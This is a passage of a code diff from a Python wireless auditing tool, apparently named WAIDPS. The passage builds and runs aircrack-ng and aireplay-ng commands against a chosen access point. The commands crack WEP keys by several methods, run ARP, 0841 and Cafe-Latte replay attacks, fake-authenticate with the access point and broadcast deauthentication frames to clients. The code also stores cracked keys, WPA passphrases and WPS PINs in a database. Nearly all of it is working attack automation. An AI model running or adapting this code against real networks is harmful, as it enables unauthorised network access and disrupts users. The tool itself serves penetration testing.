+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [256Bit]' -e 'aircrack-ng -a 1 -n 256 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEP512":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [512Bit]' -e 'aircrack-ng -a 1 -n 512 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEPKorek":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [Korek]' -e 'aircrack-ng -a 1 -K -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEPX1":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [Enabled Last Keybyte Bruteforce]' -e 'aircrack-ng -a 1 -x1 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEPX2":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [Enabled Last 2 Keybytes Bruteforce]' -e 'aircrack-ng -a 1 -x2 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEPDecloak":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [Decloak Mode]' -e 'aircrack-ng -a 1 -D -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="ARP_1":
+        WEPAttack="1"
+        WEP_METHOD="ARP Request Replay"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -3 -b " + str(__builtin__.ATTACK_AP_BSSID) + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_ARPRESULT.txt" + "' "
+    if Mode=="0841_1":
+        WEPAttack="1"
+        WEP_METHOD="Interactive Natural Replay"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -2 -b " + str(__builtin__.ATTACK_AP_BSSID)  + " -t 1 -F " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_REPLAY__1.txt" + "' "   # "| tee " + FName + "_REPLAY_
+    if Mode=="0841_2":
+        WEPAttack="1"
+        WEP_METHOD="Interactive 0841 Replay (Modified)"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -t 1 -x 600 -F -b " + str(__builtin__.ATTACK_AP_BSSID)  + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_REPLAY__2.txt" + "' "
+    if Mode=="0841_3":
+        WEPAttack="1"
+        WEP_METHOD="Interactive 0841 Replay (Rebroadcast)"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -F -b " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_REPLAY__3.txt" + "' "
+    if Mode=="0841_4":
+        WEPAttack="1"
+        WEP_METHOD="Interactive 0841 Replay (68/86 ARP AP<->STN)"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " STN >" + " Method' -e 'aireplay-ng -2 -p 0841 -m 68 -n 86 -t 1 -f 0 -c ff:ff:ff:ff:ff:ff -F -b " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_REPLAY__4A.txt" + "' "
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+        __builtin__.ProcID=ps.pid
+        __builtin__.ProcIDList.append (str(__builtin__.ProcID))
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " AP >" + " Method' -e 'aireplay-ng -2 -p 0841 -m 68 -n 86 -f 1 -c ff:ff:ff:ff:ff:ff -F -b " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_REPLAY__4B.txt" + "' "
+    if Mode=="0841_5":
+        WEPAttack="1"
+        WEP_METHOD="Interactive 0841 Replay (Send Beacon)"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -2 -p 0841 -v 8 -u 0 -w 0 -F -b " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_REPLAY__5.txt" + "' "
+    if Mode=="0841_6":
+        WEPAttack="1"
+        WEP_METHOD="Interactive 0841 Replay (Clear-To-Send)"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -2 -p 0841 -v 12 -u 1 -w 0 -m 10 -n 2000 -F -b " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_REPLAY__6.txt" + "' "
+    if Mode=="CAFE":
+        WEPAttack="1"
+        WEP_METHOD="Cafe-Latte"
+        cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -6 -D -b " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + FName + "_CAFE.txt" + "' "
+    if Mode=="ARP_2" or Mode=="IA_ARP_REPLAY":
+        if Mode=="ARP_2":
+            WEP_METHOD="ARP Request Replay (ARP File)"
+        if Mode=="IA_ARP_REPLAY":
+            WEP_METHOD="Interactive ARP Request Replay (ARP File)"
+        if len(__builtin__.WEP_ARPFILELIST)>0:
+            DisplayARPFileList()
+            if len(__builtin__.WEP_ARPFILELIST)==1:
+                if IsFileDirExist(tmpdir + str(__builtin__.WEP_ARPFILELIST[0]))=="F":
+                    ARPFileUse=__builtin__.WEP_ARPFILELIST[0]
+            else:
+                usr_resp=AskQuestion("Enter the file to use","","","","1")
+                if usr_resp!="":
+                    if IsFileDirExist(tmpdir + usr_resp)=="F":
+                        ARPFileUse=tmpdir + usr_resp
+                    else:
+                        printc ("!",fcolor.SRed + "File [ " + tmpdir + usr_resp + " ] not found !","")
+            print ""
+            if ARPFileUse!="":
+                WEPAttack="1"
+                if Mode=="ARP_2":
+                    cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -3 -b " + str(__builtin__.ATTACK_AP_BSSID) + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " -r " + str(ARPFileUse) + " " + str(__builtin__.SELECTED_ATK) + "'"
+                if Mode=="IA_ARP_REPLAY":
+                    cmdLine="xterm -geometry 100x5-0-120 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing Using " + str(WEP_METHOD) + " Method' -e 'aireplay-ng -2 -F -r " + str(ARPFileUse) + " " + str(__builtin__.SELECTED_ATK) + "'"
+        else:
+            printc ("!",fcolor.SRed + "No ARP file found !","")
+            
+    if WEPAttack!="":
+        if ToDisplay=="1":
+            if WEPAttack=="1":
+                printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink +    "Auditing Access Point [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BPink + " ] using [ " + fcolor.BRed + str(WEP_METHOD) + fcolor.BPink + " ] method...","")
+                if ARPFileUse!="":
+                     printc (" " , "                      " + fcolor.SWhite + "Selected File to use  : " + str(ARPFileUse) + "\n" ,"")
+            if WEPAttack=="2":
+                printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink +    str(WEP_METHOD) + " on Access Point [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BPink + " ]...","")
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+        __builtin__.ProcID=ps.pid
+    __builtin__.ProcIDList.append (str(__builtin__.ProcID))
+    return __builtin__.ProcID
+
+def DisplayAPDetail():
+    if __builtin__.ATTACK_AP_BSSID=="" or __builtin__.ATTACK_AP_FS=="":
+        print ""
+        printc ("!!!","Waiting for information.... please wait...","")
+        return
+    OUI=Check_OUI(__builtin__.ATTACK_AP_BSSID,"")
+    AP_ACTIVE=fcolor.BBlack + "Idle   "
+    BC_ACTIVE="Idle   "
+    if str(__builtin__.ATTACK_AP_PDATA)=="":
+        __builtin__.ATTACK_AP_PDATA=str(__builtin__.ATTACK_AP_DATA).lstrip().rstrip()
+    if __builtin__.ATTACK_AP_PDATA!=str(__builtin__.ATTACK_AP_DATA).lstrip().rstrip():
+        __builtin__.ATTACK_AP_PDATA=str(__builtin__.ATTACK_AP_DATA).lstrip().rstrip()
+        AP_ACTIVE=fcolor.BRed + "Active "
+    if str(__builtin__.ATTACK_AP_PBEACON)=="":
+        __builtin__.ATTACK_AP_PBEACON=str(__builtin__.ATTACK_AP_BEACON).lstrip().rstrip()
+    if __builtin__.ATTACK_AP_PBEACON!=str(__builtin__.ATTACK_AP_BEACON).lstrip().rstrip():
+        __builtin__.ATTACK_AP_PBEACON=str(__builtin__.ATTACK_AP_BEACON).lstrip().rstrip()
+        BC_ACTIVE="Active "
+    BC_DATA= str(__builtin__.ATTACK_AP_BEACON).lstrip().rstrip() + " " + str(BC_ACTIVE)
+    BC_DATA=str(BC_DATA).ljust(14) + " "
+    BC_DATA=str(BC_DATA).replace("Idle",fcolor.BBlack + "Idle").replace("Active",fcolor.BRed + "Active")
+    printc (".", txtColor + "BSSID      : " + fcolor.BPink + str(__builtin__.ATTACK_AP_BSSID) + "\t\t" + txtColor + "  MAC OUI   : " + fcolor.BCyan + str(OUI),"")
+    printc (" ", txtColor + "ESSID      : " + fcolor.BYellow + str(__builtin__.ATTACK_AP_ESSID.lstrip()),"")
+    printc (" ", txtColor + "Encryption : " + StdColor + str(__builtin__.ATTACK_AP_PRIVACY).lstrip() + txtColor + " / " + StdColor + str(__builtin__.ATTACK_AP_CIPHER) + txtColor + " / "+ StdColor + str(__builtin__.ATTACK_AP_AUTH) ,"")
+    printc (" ", txtColor + "Channel    : " + StdColor + str(__builtin__.ATTACK_AP_CH) + txtColor + "\t\t\t\t  Power     : " + StdColor + str(__builtin__.ATTACK_AP_PWR).lstrip().rstrip() + " dBm" + txtColor + "\t\t     Beacons : " + StdColor + str(BC_DATA) + txtColor + "\tData    : " + StdColor + str(__builtin__.ATTACK_AP_DATA).lstrip().rstrip() + " " + AP_ACTIVE  + "","")
+    Elapse=CalculateTime (str(__builtin__.ATTACK_AP_LS).lstrip().rstrip(),str(__builtin__.ATTACK_AP_LS).lstrip().rstrip())
+    printc (" ", txtColor + "First Seen : " + StdColor + str(__builtin__.ATTACK_AP_FS).lstrip().rstrip() + txtColor + "\t\t  Last Seen : " + StdColor + str(__builtin__.ATTACK_AP_LS).lstrip().rstrip() + txtColor + "    Seen    : " + StdColor + str(__builtin__.TimeGapFull) + " ago" + txtColor + "\tClients : " + StdColor + str(len(__builtin__.CUR_CLIENT)),"")
+    ATK_MAC=GetMyMAC(__builtin__.SELECTED_ATK)
+    OUI=Check_OUI(ATK_MAC,"")
+    printc (" ", txtColor + "ATK IFace  : " + StdColor + str(__builtin__.SELECTED_ATK) + txtColor + "\t[ " + fcolor.SRed + str(ATK_MAC) + txtColor + " ]   OUI : " + fcolor.SCyan + str(OUI),"")
+    IFACE_MAC=GetMyMAC(__builtin__.SELECTED_IFACE)
+    OUI=Check_OUI(IFACE_MAC,"")
+    printc (" ", txtColor + "Interface  : " + StdColor + str(__builtin__.SELECTED_IFACE) + txtColor + "\t[ " + fcolor.SRed + str(IFACE_MAC) + txtColor + " ]   OUI : " + fcolor.SCyan + str(OUI),"")
+    FS="";__builtin__.CapFileSize="";DCapFile=fcolor.BBlack + "No captured file."
+    if IsFileDirExist(__builtin__.CapFile)=="F": 
+        statinfo = os.stat(__builtin__.CapFile)
+        __builtin__.CapFileSize=statinfo.st_size 
+        GetFileDetail(__builtin__.CapFile)
+        FS=fcolor.SWhite + "   [Size : " + str(__builtin__.FileSize) + " ]"
+        DCapFile=__builtin__.CapFile
+    printc (" ", txtColor + "Cap File   : " + fcolor.SBlue + str(DCapFile)+ fcolor.SBlack + str(FS),"")
+    if __builtin__.HS_FileFull!="":
+        if IsFileDirExist(__builtin__.HS_FileFull)=="F": 
+            statinfo = os.stat(__builtin__.HS_FileFull)
+            __builtin__.CapFileSize=statinfo.st_size 
+            GetFileDetail(__builtin__.HS_FileFull)
+            FS=fcolor.SWhite + "   [Size : " + str(__builtin__.FileSize) + " ]"
+            printc (" ", txtColor + "Handshake  : " + fcolor.SBlue + str(__builtin__.HS_FileFull)+ fcolor.SBlack + str(FS) + fcolor.SYellow + "  Non-Strict","")
+    SIGNALBAR=0    
+    if str(__builtin__.ATTACK_AP_PWR).lstrip().rstrip()[:1]=="-":
+        SIGNAL=str(__builtin__.ATTACK_AP_PWR).lstrip().rstrip()[1:]
+    else:
+        SIGNAL=str(__builtin__.ATTACK_AP_PWR).lstrip().rstrip()
+    if SIGNAL!="127" and SIGNAL!="1" and SIGNAL!="" and SIGNAL.isdigit()==True:
+        SIGNALBAR=int(100 - int(SIGNAL))/2
+    
+    BarColor=fcolor.BGIGreen
+    if int(SIGNAL)>65:
+        BarColor=fcolor.BGIYellow
+    if int(SIGNAL)>79:
+        BarColor=fcolor.BGIRed
+    DText=DisplayBar("Signal     : ", " ", SIGNALBAR,__builtin__.ATTACK_AP_PWR + " dBm [ " + str(100 - int(SIGNAL)) + " % ]" , 80, fcolor.SGreen, BarColor, fcolor.BWhite)
+    print tabspacefull + DText
+    DrawLine("^",fcolor.CReset + fcolor.Black,"","")
+
+def DisplayARPFileList():
+    if len(__builtin__.WEP_ARPFILELIST)>0:
+        cl=0
+        fct=0
+        GoodBad=""
+        printc ("i",fcolor.BBlue + "List of saved ARP files.","")
+       
+        while cl<len(__builtin__.WEP_ARPFILELIST):
+            if IsFileDirExist(tmpdir + __builtin__.WEP_ARPFILELIST[cl])=="F":
+                GetFileDetail(tmpdir + __builtin__.WEP_ARPFILELIST[cl])
+                if int(__builtin__.FileSizeB)<600:
+                    GoodBad="Bad"
+                else:
+                    GoodBad=""
+                FName=str(__builtin__.WEP_ARPFILELIST[cl]).replace(tmpdir,"")
+                printc(" ",fcolor.SGreen + str(FName) + "\t" + fcolor.SWhite + str(__builtin__.FileModified) + "\t" + str(__builtin__.FileSize) + "\t" + str(GoodBad), "")
+                fct = fct + 1
+            cl = cl+1
+        print ""
+        printc ("i",fcolor.BWhite + "Total " + fcolor.BRed + str(fct) + fcolor.BWhite + " file(s) listed.","")
+    else:
+        printc ("!",fcolor.SRed + "No saved ARP file found !!","")
+        print "";
+
+def CheckARPFile(ARPFile):
+    Result=""
+    if IsFileDirExist(ARPFile)=="F":
+        with open(ARPFile,"r") as f:
+            for line in f:
+                line=line.replace("\n","").replace("\00","")
+                if str(line).find("Saving ARP requests in")!=-1 or str(line).find("Saving chosen packet in")!=-1:
+                    Cat=str(line).split(" ")
+                    if len(Cat)>4:
+                         Result=str(Cat[4])
+                         if Result!="":
+                             if IsFileDirExist(tmpdir + Result)=="F":
+                                 __builtin__.WEP_ARPFILELIST=AddIfNotDuplicate(Result,__builtin__.WEP_ARPFILELIST)
+                             DelFile (ARPFile,"")
+    return Result
+    
+
+def ShutDownAuditingWindows():
+    Search="WAIDPS - Auditing"
+    KillProc(Search)
+    Search="WAIDPS - Associating"
+    KillProc(Search)
+    Search="WAIDPS - Cracking"
+    KillProc(Search)
+    Search="WAIDPS - Sniffing"
+    KillProc(Search)
+
+def CheckCrackDB(BSSID):
+    FOUND=""
+    if IsFileDirExist(CrackDB)=="F":
+        with open(CrackDB,"r") as f:
+            for line in f:
+                line=line.replace("\n","").replace("\00","")
+                tabstr=";"
+                if line!="" and FOUND=="":
+                    tmpline=str(line).split(";")
+                    tmpBSSID=str(tmpline[0])
+                    tmpEnc=str(tmpline[1])
+                    tmpEncKey=str(tmpline[2])
+                    tmpESSID=str(tmpline[3])
+                    tmpHSFILE=str(tmpline[4])
+                    tmpWPS=str(tmpline[5])
+                    if str(tmpBSSID).upper()==str(BSSID).upper():
+                        FOUND="1"
+                    if str(tmpHSFILE)!="" and str(tmpHSFILE)==str(BSSID):
+                        FOUND="1"
+                    if FOUND=="1":
+                        __builtin__.DB_BSSID=tmpBSSID
+                        __builtin__.DB_ENCTYPE=tmpEnc
+                        __builtin__.DB_ENCKEY=tmpEncKey
+                        __builtin__.DB_ESSID=tmpESSID
+                        __builtin__.DB_HSFILE=tmpHSFILE
+                        __builtin__.DB_WPS=tmpWPS
+    return FOUND
+
+def AddCrackDB(BSSID,Enc,EncKey,ESSID,HS_File,WPS):
+    if IsFileDirExist(CrackDB)=="F":
+        newline=""
+        FOUND=""
+        IGNORE=""
+        with open(CrackDB,"r") as f:
+            for line in f:
+                line=line.replace("\n","").replace("\00","")
+                if str(line)!="":
+                    x=0
+                    MODI=""
+                    tabstr=";"
+                    WPA_HS=""
+                    tmpline=str(line).split(";")
+                    tmpBSSID=str(tmpline[0])
+                    tmpEnc=str(tmpline[1])
+                    tmpEncKey=str(tmpline[2])
+                    tmpESSID=str(tmpline[3])
+                    tmpHSFile=str(tmpline[4])
+                    tmpWPS=str(tmpline[5])
+                    if str(HS_File)!="" and FOUND=="":
+                        if str(tmpHSFile)==str(HS_File) and str(tmpBSSID).upper()==str(BSSID).upper():
+                            WPA_HS="1";FOUND="1"
+                    else:
+                        if str(tmpBSSID).upper()==str(BSSID).upper() and FOUND=="":
+                            FOUND="1"
+                    if FOUND=="1":
+                        FOUND="2"
+                        if WPA_HS=="":
+                            EncType="Encryption type "
+                        elif WPA_HS=="1":
+                            EncType="WPA Passphase "
+    
+                        if str(tmpEnc).upper()!=str(Enc).upper():
+                            printc ("i",fcolor.SGreen + EncType + "found on Database is [ " + fcolor.BYellow + tmpEnc + fcolor.SGreen + " ], Encryption found [ " + fcolor.BYellow + str(Enc) + fcolor.SGreen + " ].","")
+                            usr_resp=AskQuestion("Replace ?","Y/n","U","Y","1")
+                            if usr_resp=="Y":
+                                tmpEnc=str(Enc) 
+                                MODI="1"
+                        if str(tmpEncKey)!=str(EncKey):
+                            printc ("i",fcolor.SGreen + EncType + "[Key] found on Database is [ " + fcolor.BYellow + tmpEncKey + fcolor.SGreen + " ], key found [ " + fcolor.BYellow + str(EncKey) + fcolor.SGreen + " ].","")
+                            usr_resp=AskQuestion("Replace ?","Y/n","U","Y","1")
+                            if usr_resp=="Y":
+                                tmpEncKey=str(EncKey)
+                                MODI="1"
+                        if str(tmpESSID)!=str(ESSID):
+                            printc ("i",fcolor.SGreen + "ESSID found on Database is [ " + fcolor.BYellow + tmpESSID + fcolor.SGreen + " ], current ESSID found is [ " + fcolor.BYellow + str(ESSID) + fcolor.SGreen + " ].","")
+                            usr_resp=AskQuestion("Replace ?","Y/n","U","Y","1")
+                            if usr_resp=="Y":
+                                tmpESSID=str(ESSID)
+                                MODI="1"
+                        if str(tmpWPS)!=str(WPS) and str(WPS)!="":
+                            printc ("i",fcolor.SGreen + "WPS PIN found on Database is [ " + fcolor.BYellow + tmpWPS + fcolor.SGreen + " ], current WPS PIN found is [ " + fcolor.BYellow + str(WPS) + fcolor.SGreen + " ].","")
+                            usr_resp=AskQuestion("Replace ?","Y/n","U","Y","1")
+                            if usr_resp=="Y":
+                                tmpWPS=str(WPS)
+                                MODI="1"
+                    datal=str(tmpBSSID) + str(tabstr) + str(tmpEnc) + str(tabstr) + str(tmpEncKey) + str(tabstr) + str(tmpESSID) + ";"+ str(tmpHSFile)+";"+ str(tmpWPS)+";"
+                    newline=newline + datal + "\n"
+            if WPS!="":
+                DWPS="WPS PIN : " + str(WPS)
+            else:
+                DWPS=""
+            if MODI=="1":
+                printc ("i", "Modification made to existing BSSID : " + BSSID + ", ESSID : " + str(ESSID) + ", Enc : " + str(Enc) + ", Key : " + str(EncKey) + "  " + str(DWPS) + "...","")
+                IGNORE="1"
+                FOUND=""
+            if MODI=="" and FOUND!="" and IGNORE=="":
+                printc ("i", "Existing informatino already found in database....","")
+                IGNORE="1"
+                FOUND=""
+            if FOUND=="" and IGNORE=="":
+                printc ("i", fcolor.BGreen + "New BSSID : " + BSSID + ", ESSID : " + str(ESSID) + ", Enc : " + str(Enc) + ", Key : " + str(EncKey) + "  " + str(DWPS) +  " added to database...","")
+                if str(HS_File)!="":
+                    printc (" ", fcolor.SGreen + "Handshake File : " + fcolor.BYellow + str(HS_File),"")
+                    newline=newline + str(BSSID) + str(tabstr) + str(Enc) + str(tabstr) + str(EncKey) + str(tabstr) + str(ESSID) + str(tabstr) + str(HS_File) + str(tabstr) + str(WPS) + str(tabstr) + "\n"
+                else:
+                    newline=newline + str(BSSID) + str(tabstr) + str(Enc) + str(tabstr) + str(EncKey) + str(tabstr) + str(ESSID) + str(tabstr) + "" + str(tabstr)  + str(WPS) + str(tabstr) + "\n"
+  
+        open(CrackDB,"w").write(newline)
+
+def Fake_Auth(TargetMAC,FName):
+    ATK_MAC=GetMyMAC(__builtin__.SELECTED_ATK)
+    MAX_ATTEMPT=5
+    WEP_ATTEMPT=1
+    WEP_AUTH=""
+    WEP_OPN=""
+    WEP_SKA=""
+    WEP_AUTHENTICATED=""
+    readout=""
+    READINGPKT=""
+    PKTREAD=0
+    DeauthCl=0
+    if str(__builtin__.ATTACK_AP_ESSID)!="":
+        AddESSID="-e \x22" + str(__builtin__.ATTACK_AP_ESSID) + "\x22 "
+    else:
+        AddESSID=""
+    cmd = [ "aireplay-ng","-1", "0","-T","1","-a",str(__builtin__.ATTACK_AP_BSSID),"-h", str(__builtin__.SELECTED_ATK_MAC), str(__builtin__.SELECTED_ATK)]
+    authfile=tmpdir + "AUTHENTICATE.txt"
+    DB_CLIENT=[]
+    if IsFileDirExist(DBFile3)=="F":
+	with open(DBFile3,"r") as f:
+            next(f)
+	    for line in f:
+                line=line.replace("\n","")
+                tmpList=str(line).split(";")
+                if len(tmpList)>=7:
+                    if tmpList[1]==__builtin__.ATTACK_AP_BSSID:
+                        CLIENTMAC=str(tmpList[0])
+                        DB_CLIENT=AddToList(CLIENTMAC,DB_CLIENT)
+    DB_CLIENT.sort()
+    if IsFileDirExist(authfile)=="F":
+        DelFile (authfile,"")
+    cmdLine="xterm -geometry 100x5-0-150 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Associating Access Point (Keep Alive)' -e 'aireplay-ng -1 6000 -o 1 -q 10 -a " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(__builtin__.SELECTED_ATK) + " | tee " + str(authfile) + "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    __builtin__.Authenticator=ps.pid
+    printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Authenticating/Associating with Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BPink + " ] using " + fcolor.BYellow + str(__builtin__.SELECTED_ATK) + fcolor.BPink + " [ " + fcolor.BYellow + str(ATK_MAC) + fcolor.BPink + " ]","")
+    while WEP_AUTH=="":
+        ATK_MAC=GetMyMAC(__builtin__.SELECTED_ATK)
+        readout=ReadAuthFile(authfile)
+        if readout.find('read ')==-1 and readout.find('packets...')==-1 and len(readout)>5 and WEP_SKA=="": 
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            if WEP_AUTHENTICATED=="":
+                printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BGreen + "Authenticating with Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BGreen + " ] using " + fcolor.BYellow + str(__builtin__.SELECTED_ATK) + fcolor.BGreen + " [ " + fcolor.BYellow + str(ATK_MAC) + fcolor.BGreen + " ]... Attempt " + fcolor.BRed + str(WEP_ATTEMPT),"")
+            else:
+                printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BGreen + "Associating with Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BGreen + " ] using " + fcolor.BYellow + str(__builtin__.SELECTED_ATK) + fcolor.BGreen + " [ " + fcolor.BYellow + str(ATK_MAC) + fcolor.BGreen + " ]... Attempt " + fcolor.BRed + str(WEP_ATTEMPT),"")
+        else:
+            pkt=str(readout).split(" ")
+            if len(pkt)>2:
+                if str(pkt[2]).find("packets...")!=-1:
+                    printl (tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SGreen + "SKA - Reading [ " + fcolor.BYellow +str(pkt[1]) + fcolor.SGreen + " ] Packets...","0","")
+                    PKTREAD = PKTREAD +1
+                    READINGPKT="1"
+                    if PKTREAD>30:
+                        PKTREAD=0
+                        DeauthBroadcast(__builtin__.ATTACK_AP_BSSID,__builtin__.SELECTED_MON,5)
+                        DeauthCl=DeauthCl+1
+                        if int(DeauthCl)>3:
+                            DeauthCl=0
+                            if len(NEWCLIENT)<2:
+                                printc (" ",fcolor.SWhite + Now() + " - " +  fcolor.SRed + "Make sure the are legitimate client to deauth...","")
+                            else:
+                                printc (" ",fcolor.SWhite + Now() + " - " +  fcolor.SRed + "Try move closer to client...","")
+        if readout.find('sending authentication request (open system)') != -1:
+            WEP_OPN="1"
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Sending authentication request to Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.SGreen + " ] (Open System) ..... ","")
+        if readout.find('no such bssid available') != -1:
+             if READINGPKT=="1":
+                 print "";READINGPKT=""
+             if str(__builtin__.ATTACK_AP_ESSID)!="":
+                 KillSubProc(str(__builtin__.Authenticator))
+                 cmdLine="xterm -geometry 100x5-0-150 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Associating Access Point (Keep Alive)' -e 'aireplay-ng -1 6000 -o 1 -q 10 -a " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " -e \x22" + str(__builtin__.ATTACK_AP_ESSID) + "\x22 " + str(__builtin__.SELECTED_ATK) + " | tee " + str(authfile) + "'"
+                 ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+                 __builtin__.Authenticator=ps.pid
+                 printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Sending authentication request to Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.SGreen + " ] ESSID : [ " + fcolor.SYellow + str(__builtin__.ATTACK_AP_ESSID) + fcolor.SGreen + " ].","")
+        if readout.find('authentication successful') != -1:
+            if WEP_AUTHENTICATED=="":
+                printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Client  [ " + fcolor.BYellow + str(ATK_MAC) + fcolor.BPink + " ] successfully authenticated with Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BPink + " ]. " + fcolor.SGreen + " Associating....","")
+            WEP_AUTHENTICATED="1"
+        if readout.find('switching to shared key authentication') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.BRed + "BSSID [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BRed + " ] is likely using Shared Key Authentication..!!","")
+            printc (" ",fcolor.SWhite + Now() + " - " + fcolor.SRed + "Switching to Shared Key Authentication (SKA). ","")
+            WEP_SKA="1"
+        if readout.find('sending authentication request (shared key)') != -1:
+            if READINGPKT=="1":
+                print "";READINGPKT=""
